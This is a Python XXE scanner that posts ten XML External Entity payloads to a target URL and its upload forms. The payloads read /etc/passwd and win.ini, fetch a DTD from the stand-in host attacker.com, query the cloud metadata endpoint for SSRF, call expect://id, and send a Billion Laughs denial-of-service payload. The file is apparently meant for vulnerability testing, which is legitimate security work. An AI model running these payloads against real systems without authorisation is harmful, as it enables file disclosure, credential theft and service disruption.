#!/usr/bin/env python3
"""
XXE (XML External Entity) Scanner
Tests for XML External Entity injection vulnerabilities
"""

import requests
import json
from datetime import datetime
from urllib.parse import urlparse
from bs4 import BeautifulSoup

class XXEScanner:
    """XXE vulnerability scanner"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

        # XXE payloads
        self.payloads = [
            # Classic XXE - File Read
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>''',

            # Windows file read
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>''',

            # PHP wrapper
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root><data>&xxe;</data></root>''',

            # Parameter entity
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<root><data>test</data></root>''',

            # Blind XXE (Out-of-Band)
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>
<root><data>test</data></root>''',

            # XXE with internal DTD
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>''',

            # UTF-7 encoded XXE
            '''<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
+ADw-root+AD4-+ADw-data+AD4-+ACY-xxe+ADsAPA-/data+AD4-+ADw-/root+AD4-''',

            # Billion Laughs (DoS)
            '''<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>''',

            # SSRF via XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>''',

            # Expect header XXE
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root><data>&xxe;</data></root>''',
        ]

        # Success indicators
        self.success_indicators = [
            # Linux /etc/passwd
            'root:',
            'daemon:',
            'bin:',
            'nobody:',
            '/bin/bash',
            '/bin/sh',

            # Windows win.ini
            '[fonts]',
            '[extensions]',
            'for Windows',

            # AWS metadata
            'ami-id',
            'instance-id',
            'security-credentials',

            # Common errors indicating XXE
            'java.io.FileNotFoundException',
            'System.IO.FileNotFoundException',
            'Failed to load external entity',
        ]

    def scan(self):
        """Run XXE scan"""
        print(f"[*] Starting XXE scan on {self.target_url}")

        # Test with different content types
        self._test_xml_endpoints()

        # Test file upload if present
        self._test_file_upload()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_xml_endpoints(self):
        """Test XML endpoints for XXE"""
        print("[*] Testing XML endpoints...")

        content_types = [
            'application/xml',
            'text/xml',
            'application/x-www-form-urlencoded'
        ]

        for content_type in content_types:
            for payload in self.payloads:
                headers = {
                    'Content-Type': content_type,
                    'Accept': 'application/xml, text/xml, */*'
                }

                try:
                    response = self.session.post(
                        self.target_url,
                        data=payload,
                        headers=headers,
                        timeout=15
                    )

                    # Check for XXE indicators in response
                    if self._check_xxe_success(response.text, payload):
                        vuln = {
                            'type': 'XXE - XML External Entity',
                            'severity': 'critical',
                            'url': self.target_url,
                            'payload': payload[:200],
                            'content_type': content_type,
                            'evidence': 'XXE vulnerability confirmed - sensitive file content exposed',
                            'cwe': 'CWE-611'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] XXE CRITICAL: File read successful!")
                        return True

                    # Check for error-based XXE
                    if self._check_xxe_errors(response.text):
                        vuln = {
                            'type': 'XXE - XML External Entity (Error-based)',
                            'severity': 'high',
                            'url': self.target_url,
                            'payload': payload[:200],
                            'content_type': content_type,
                            'evidence': 'XXE-related error messages detected',
                            'cwe': 'CWE-611'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] Possible XXE: Error-based detection")
                        return True

                except requests.exceptions.Timeout:
                    # Timeout might indicate DoS XXE
                    if 'lolz' in payload:
                        vuln = {
                            'type': 'XXE DoS - Billion Laughs',
                            'severity': 'high',
                            'url': self.target_url,
                            'payload': payload[:200],
                            'evidence': 'Server timeout with billion laughs payload',
                            'cwe': 'CWE-611'
                        }
                        self.vulnerabilities.append(vuln)
                        print(f"[!] XXE DoS detected!")

                except Exception as e:
                    pass

        return False

    def _test_file_upload(self):
        """Test file upload for XXE"""
        print("[*] Testing file upload endpoints...")

        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Find file upload forms
            forms = soup.find_all('form', enctype='multipart/form-data')

            for form in forms:
                action = form.get('action', '')
                action_url = self._resolve_url(action)

                file_inputs = form.find_all('input', type='file')

                if file_inputs:
                    for payload in self.payloads[:3]:  # Test only first few
                        # Create XXE file
                        files = {
                            file_inputs[0].get('name', 'file'): (
                                'xxe.xml',
                                payload,
                                'application/xml'
                            )
                        }

                        # Get other form data
                        form_data = {}
                        for input_field in form.find_all('input'):
                            if input_field.get('type') != 'file':
                                name = input_field.get('name')
                                value = input_field.get('value', '')
                                if name:
                                    form_data[name] = value

                        try:
                            response = self.session.post(
                                action_url,
                                data=form_data,
                                files=files,
                                timeout=15
                            )

                            if self._check_xxe_success(response.text, payload):
                                vuln = {
                                    'type': 'XXE via File Upload',
                                    'severity': 'critical',
                                    'url': action_url,
                                    'payload': payload[:200],
                                    'evidence': 'XXE via XML file upload',
                                    'cwe': 'CWE-611'
                                }
                                self.vulnerabilities.append(vuln)
                                print(f"[!] XXE via file upload!")
                                return True

                        except Exception as e:
                            pass

        except Exception as e:
            print(f"[!] Error testing file upload: {e}")

        return False

    def _check_xxe_success(self, response_text, payload):
        """Check if XXE was successful"""
        for indicator in self.success_indicators:
            if indicator in response_text:
                return True
        return False

    def _check_xxe_errors(self, response_text):
        """Check for XXE-related errors"""
        error_patterns = [
            'xml parse',
            'xml parser',
            'DOCTYPE',
            'ENTITY',
            'SAXParseException',
            'org.xml',
            'javax.xml',
            'XMLStreamException',
            'java.io.FileNotFoundException',
            'System.IO.FileNotFoundException',
            'Failed to load external entity'
        ]

        response_lower = response_text.lower()

        for pattern in error_patterns:
            if pattern.lower() in response_lower:
                return True

        return False

    def _resolve_url(self, path):
        """Resolve relative URL to absolute"""
        if path.startswith('http'):
            return path

        parsed = urlparse(self.target_url)
        if path.startswith('/'):
            return f"{parsed.scheme}://{parsed.netloc}{path}"
        else:
            base = '/'.join(parsed.path.split('/')[:-1])
            return f"{parsed.scheme}://{parsed.netloc}{base}/{path}"

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 xxe_scanner.py <url>")
        print("\nExample:")
        print("  python3 xxe_scanner.py https://example.com/api/upload")
        sys.exit(1)

    scanner = XXEScanner(sys.argv[1])
    results = scanner.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Vulnerabilities found: {len(results['vulnerabilities'])}")

    if len(results['vulnerabilities']) > 0:
        print(f"\n[!] WARNING: XXE vulnerabilities detected!")
        print(f"    These are CRITICAL issues that can lead to:")
        print(f"    - File disclosure")
        print(f"    - SSRF attacks")
        print(f"    - DoS attacks")
        print(f"    Report immediately!")
